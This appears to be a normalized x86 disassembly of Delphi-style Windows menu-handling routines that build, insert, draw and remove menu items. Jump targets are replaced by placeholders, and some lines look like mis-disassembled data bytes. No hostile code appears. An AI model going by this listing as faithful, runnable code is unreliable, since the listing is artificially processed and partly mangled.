mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404210
push eax
mov eax edi
call sub_404210
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404210
push eax
mov eax edi
call sub_404410
push eax
mov eax [ esi ]
call sub_404410
pop edx
pop ecx
call sub_407f2c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404210
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044b0
sub_4594a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_459583
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45944c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45944c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45944c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45944c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45958a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_459248
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407edc
test eax eax
jne r-xdata
sub_4595c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45bb60
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45bb70
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_459620
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45bb60
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45bb60
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45bb70
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45bb70
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4595c0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4595c0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45bb70
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45bb70
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45976c
push ebx
mov ebx eax
mov eax ebx
call sub_456268
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45e67c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4597a4
push ebx
mov ebx eax
mov eax ebx
call sub_45627c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4597d4
push ebx
mov ebx eax
mov eax ebx
call sub_456290
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459804
push ebx
mov ebx eax
mov eax ebx
call sub_4562b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459834
push ebx
mov ebx eax
mov eax ebx
call sub_4562e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40435c
je r-xdata
mov al 0x1
pop ebx
retn
sub_459868
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4562a4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_4598a4
push ebx
mov ebx eax
mov eax ebx
call sub_4562f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4598d8
push ebx
mov ebx eax
mov eax ebx
call sub_456308
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45990c
push ebx
mov ebx eax
mov eax ebx
call sub_45631c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403304
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459940
push ebx
mov ebx eax
mov eax ebx
call sub_4218bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_459968
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_459988
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45b9c8
sub_4599a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45ba38
sub_4599c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45ba8c
sub_4599e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_459a04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fa4
sub_459a28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45bbb8
sub_459a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45bb94
sub_459a68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45bba8
sub_459a88
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_459ab4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420fcc
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_4595a0
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45c4c4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_459b30
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45e460
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45bb60
test eax eax
jg r-xdata
mov edx esi
call sub_45bef8
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45bb70
call sub_403154
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403154
lea eax [ esi + 0x44 ]
call sub_40d130
lea eax [ esi + 0x78 ]
call sub_40d130
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_459f4c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418adc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
call sub_403154
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_459be4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459e3f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e46
lea eax [ ebp - 0x40 ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403fe8
mov eax ebx
call sub_45bb60
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45a0f4
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40435c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45bb60
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45c11c
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_459248
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042d0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404410
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404410
push eax
mov eax ebx
call sub_45a0f4
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45b738
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40435c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404410
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45bb60
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45a0f4
mov [ ebp - 0x25 ] eax
sub_459e5f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_459be4
xor eax eax
pop ebp
retn
sub_459e84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45d758
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45c720
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45cc1c
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_459620
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_459ef4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_459f3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d9b8
mov eax [ ebp - 0x4 ]
call sub_4594a8
mov edx eax
mov eax ebx
call sub_45bb94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f45
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_459f4c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_459fc4
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_42109c
sub_459f88
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42141c
mov eax ebx
call sub_45bb48
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45bb48
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403350
pop esi
pop ebx
retn
mov eax ebx
call sub_459fc4
sub_459fc4
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45a0f4
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_459fc4
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45a0f4
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45a0f4
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_459e84
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebp
call sub_45a0f4
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a094
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45bb60
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45bb70
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45bb70
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45bb70
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45919c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45a0f4
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_459e84
mov eax [ rw-data ]
call sub_45919c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45a140
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421344
push ebx
push sub_459ef4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45a184
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45a368
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45c11c
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fe8
test bh 0x4
je r-xdata
mov eax edi
call sub_45d758
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424910
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404218
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_4242e8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_4242f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a36f
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424fb8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404210
push eax
mov eax [ ebp - 0xc ]
call sub_404410
push eax
mov eax [ ebp - 0x4 ]
call sub_424fb8
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424028
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404210
push eax
mov eax [ ebp - 0xc ]
call sub_404410
push eax
mov eax [ ebp - 0x4 ]
call sub_424fb8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_424028
mov eax 0xff00000d
call sub_423b68
mov esi eax
mov eax 0xff000010
call sub_423b68
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424028
jmp r-xdata
sub_45a3d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45acbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4247f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_424028
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4247f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
